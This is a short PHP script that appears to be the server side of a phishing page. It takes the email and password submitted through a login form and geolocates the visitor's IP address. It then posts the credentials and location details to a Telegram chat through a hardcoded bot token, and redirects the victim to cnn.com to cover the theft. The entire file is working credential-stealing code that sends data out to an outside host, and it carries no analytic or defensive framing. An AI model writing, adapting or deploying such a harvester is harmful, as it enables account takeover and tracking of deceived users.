<?php
// Function to get geolocation based on IP
function getGeoLocation($ip) {
    $url = "http://ip-api.com/json/$ip"; // API URL for IP geolocation
    $json = file_get_contents($url);
    $data = json_decode($json, true);
    return $data;
}

// Define your variables
$email = $_POST['email'] ?? ''; // Get the email from the form
$password = $_POST['password'] ?? ''; // Get the password from the form
$ip = $_SERVER['REMOTE_ADDR']; // Get user's IP address

// Get geolocation data based on IP
$geoData = getGeoLocation($ip);
$city = $geoData['city'] ?? '';
$region = $geoData['regionName'] ?? '';
$country = $geoData['country'] ?? '';
$isp = $geoData['isp'] ?? '';
$latitude = $geoData['lat'] ?? '';
$longitude = $geoData['lon'] ?? '';

// Get current timestamp
$timestamp = date('Y-m-d H:i:s'); // Current timestamp

// Compose the message with timestamp
$message = "Timestamp: $timestamp\nEmail Address: $email\nPassword: $password\n\nIP Address: $ip\nCity: $city\nRegion: $region\nCountry: $country\nISP: $isp\nLatitude: $latitude\nLongitude: $longitude";

// Your Telegram bot token and chat ID
$botToken = '5666032731:AAF6j667DdHdwNqcUJ62_FXnFMbDJVjBC4A';
$chatID = '5142579051';

// Prepare the request URL
$telegramURL = "https://api.telegram.org/bot$botToken/sendMessage";

// Set the message parameters
$params = [
    'chat_id' => $chatID,
    'text' => $message
];

// Initialize cURL session
$ch = curl_init($telegramURL);

// Set cURL options
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $params);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

// Execute cURL session
$result = curl_exec($ch);

// Close cURL session
curl_close($ch);

// Redirect to a page after sending the message
header("Location: https://cnn.com");
exit();
?>
